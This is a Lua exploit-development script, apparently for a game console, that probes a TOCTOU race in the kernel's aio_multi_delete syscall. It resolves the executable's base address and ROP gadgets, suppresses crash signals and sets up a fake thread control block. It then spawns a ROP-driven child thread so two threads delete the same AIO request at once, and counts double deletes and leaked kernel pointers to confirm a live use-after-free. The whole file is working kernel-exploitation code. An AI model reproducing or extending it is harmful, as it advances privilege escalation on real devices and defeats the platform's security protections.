-- CRASH_CLASS: HIGH
-- PROBE 65h: aio_multi_delete TOCTOU race — poll before delete
--
-- 65g failed: delete without prior poll returns 0x80020010 even on
-- a fresh process. But 65f [A] which polled first returned state=0.
-- Every successful 662 in 352a/352p also polled (664) first.
--
-- Hypothesis: poll(664) transitions the AIO request to a "reaped"
-- state, and only reaped requests can be deleted by 662.
--
-- Race strategy: both threads poll, then both try to delete.
-- The TOCTOU is in the delete path's lock-drop-reacquire, so
-- the race target is still two concurrent 662 calls.

print("=== PROBE 65h: aio_multi_delete race (poll+delete) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- Ignore SIGSEGV + SIGSYS
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- Fake TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- Open /dev/zero
local fd_zero = -1
repeat
    local ok, rv = pcall(function() return mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)) end)
    if ok then fd_zero = sgn(rv) end
until true
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("ABORT: no /dev/zero"); return end

-- AIO buffers
local reqs = memory.alloc(0x200)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local ids_main = memory.alloc(0x100)
local states_main = memory.alloc(0x100)
local ids_child = memory.alloc(0x100)
local states_child = memory.alloc(0x100)

local function fill_req(base, fd)
    wq(base + 0x00, uint64(0))
    wq(base + 0x08, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(base + 0x10, bl); wd(base + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(base + 0x18, rl); wd(base + 0x1C, rh)
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

local function aio_submit(fd)
    fill_req(N(reqs), fd)
    wd(N(result_buf), 0)
    wd(N(ids_main), 0)
    local ok, rv = pcall(function()
        return mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_main)))
    end)
    return ok and sgn(rv) or nil, rd(N(ids_main)) or 0
end

local function aio_poll(id, id_buf, st_buf)
    wd(N(id_buf), id)
    wd(N(st_buf), 0xDEADDEAD)
    local ok, rv = pcall(function()
        return mk(664)(uint64(N(id_buf)), uint64(1), uint64(N(st_buf)))
    end)
    return ok and sgn(rv) or nil, rd(N(st_buf)) or 0
end

local function aio_delete(id, id_buf, st_buf)
    wd(N(id_buf), id)
    wd(N(st_buf), 0xDEADDEAD)
    local ok, rv = pcall(function()
        return mk(662)(uint64(N(id_buf)), uint64(1), uint64(N(st_buf)))
    end)
    return ok and sgn(rv) or nil, rd(N(st_buf)) or 0
end

-- [A] Sanity: poll then delete
print("")
print("[A] sanity — poll THEN delete")
local s_ret, s_id = aio_submit(fd_zero)
print(string.format("  submit: ret=%s id=0x%08X", tostring(s_ret), s_id))

local p_ret, p_state = aio_poll(s_id, ids_main, states_main)
print(string.format("  poll:   ret=%s state=0x%08X", tostring(p_ret), p_state))

local d_ret, d_state = aio_delete(s_id, ids_main, states_main)
print(string.format("  delete: ret=%s state=0x%08X (%s)", tostring(d_ret), d_state,
    d_state == 0 and "OK" or "FAIL"))

if d_state ~= 0 then
    -- Try: poll twice then delete
    print("")
    print("[A2] double-poll then delete")
    local s2_ret, s2_id = aio_submit(fd_zero)
    print(string.format("  submit: ret=%s id=0x%08X", tostring(s2_ret), s2_id))
    aio_poll(s2_id, ids_main, states_main)
    local p2_ret, p2_state = aio_poll(s2_id, ids_main, states_main)
    print(string.format("  poll2:  ret=%s state=0x%08X", tostring(p2_ret), p2_state))
    local d2_ret, d2_state = aio_delete(s2_id, ids_main, states_main)
    print(string.format("  delete: ret=%s state=0x%08X (%s)", tostring(d2_ret), d2_state,
        d2_state == 0 and "OK" or "FAIL"))

    if d2_state ~= 0 then
        print("")
        print("  Delete still fails after poll. Testing all state transitions...")
        print("")

        -- [A3] Exhaustive: try every combination
        print("[A3] exhaustive state transitions")
        local combos = {
            {"submit-delete",          function(id) return aio_delete(id, ids_main, states_main) end},
            {"submit-poll-delete",     function(id)
                aio_poll(id, ids_main, states_main)
                return aio_delete(id, ids_main, states_main)
            end},
            {"submit-poll-poll-delete", function(id)
                aio_poll(id, ids_main, states_main)
                aio_poll(id, ids_main, states_main)
                return aio_delete(id, ids_main, states_main)
            end},
        }

        for ci = 1, #combos do
            local sr, sid = aio_submit(fd_zero)
            if sr == 0 and sid ~= 0 then
                local dr, ds = combos[ci][2](sid)
                print(string.format("  %s: state=0x%08X (%s)",
                    combos[ci][1], ds, ds == 0 and "OK" or "FAIL"))
            end
        end

        -- [A4] Check if the 65f session just got lucky with id 0x228
        -- Maybe certain id ranges work and others don't?
        print("")
        print("[A4] submit 5 requests, poll all, delete all")
        local test_ids = {}
        for i = 1, 5 do
            local tr, tid = aio_submit(fd_zero)
            if tr == 0 and tid ~= 0 then
                table.insert(test_ids, tid)
            end
        end
        print("  ids: " .. table.concat(test_ids, ", "))
        for i = 1, #test_ids do
            aio_poll(test_ids[i], ids_main, states_main)
        end
        for i = 1, #test_ids do
            local dr, ds = aio_delete(test_ids[i], ids_main, states_main)
            print(string.format("  delete 0x%X: state=0x%08X (%s)", test_ids[i], ds,
                ds == 0 and "OK" or "FAIL"))
        end
    end

    if not alive() then print("DEAD"); return end
    print("")
    print("=== 65h COMPLETE (no working delete path found) ===")
    return
end

-- If we got here, poll+delete works!
print("  Poll+delete confirmed working!")
if not alive() then print("DEAD"); return end

-- [B] TOCTOU RACE with poll+delete
print("")
print("[B] TOCTOU race — both threads poll+delete")

local RACE_ITERS = 20
local double_success = 0
local kptrs = 0
local main_wins = 0
local child_wins = 0

for iter = 1, RACE_ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    local sr, sid = aio_submit(fd_zero)
    if sr ~= 0 or sid == 0 then
        print(string.format("  iter %d: submit fail", iter))
        break
    end

    -- Main thread polls first (transitions to reaped state)
    aio_poll(sid, ids_main, states_main)

    -- Prepare child buffers
    wd(N(ids_child), sid)
    wq(N(states_child), uint64(0xBAD0DEAD))

    -- Build child ROP: sysarch + poll + delete + thr_exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    for i = 0, ss - 1, 4 do wd(sb + i, 0) end

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(SET_FSBASE=129)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fs_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)

    -- 662(ids_child, 1, states_child) — child deletes
    emit(g_pop_rdi); emit(uint64(N(ids_child)))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(N(states_child)))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)

    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    -- thr_param
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, g_bare_ret)
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_buf = memory.alloc(8); wq(N(tid_buf), uint64(0))
    wq(pa + 0x30, tid_buf)

    -- Spawn child
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- RACE: main also deletes same ID
    local main_ret, main_state = aio_delete(sid, ids_main, states_main)

    -- Resubmit to fill freed slot
    local rs_ret, rs_id = aio_submit(fd_zero)

    -- Wait for child
    for w = 1, 30000 do local _ = rd(sb) end

    local child_raw = rq(N(states_child))
    local csh, csl = get_hi_lo(child_raw)
    local m_ok = (main_state == 0)
    local c_ok = (csl == 0 and csh == 0)

    if m_ok and c_ok then
        double_success = double_success + 1
        print(string.format("  iter %d: *** DOUBLE DELETE *** resub=0x%X", iter, rs_id or 0))
    elseif m_ok then
        main_wins = main_wins + 1
    elseif c_ok then
        child_wins = child_wins + 1
    end

    if iter <= 5 or iter == RACE_ITERS or (m_ok and c_ok) then
        print(string.format("  iter %d: main=0x%X child=%s %s",
            iter, main_state, fmt(child_raw),
            m_ok and c_ok and "*** DOUBLE ***" or
            m_ok and "(main won)" or
            c_ok and "(child won)" or "(both fail)"))
    elseif iter == 6 then
        print("  ...")
    end

    if csh ~= 0 and csh ~= 0xFFFFFFFF and csh >= 0xFFFF8000 then
        kptrs = kptrs + 1
    end

    if rs_ret == 0 and rs_id and rs_id ~= 0 then
        aio_poll(rs_id, ids_main, states_main)
        aio_delete(rs_id, ids_main, states_main)
    end
end

print("")
print("[C] SUMMARY")
print(string.format("  DOUBLE DELETES:  %d / %d", double_success, RACE_ITERS))
print(string.format("  main won:        %d", main_wins))
print(string.format("  child won:       %d", child_wins))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if double_success > 0 then
    print("*** RACE CONFIRMED — UAF IS LIVE ***")
end

print("")
print("=== 65h COMPLETE ===")
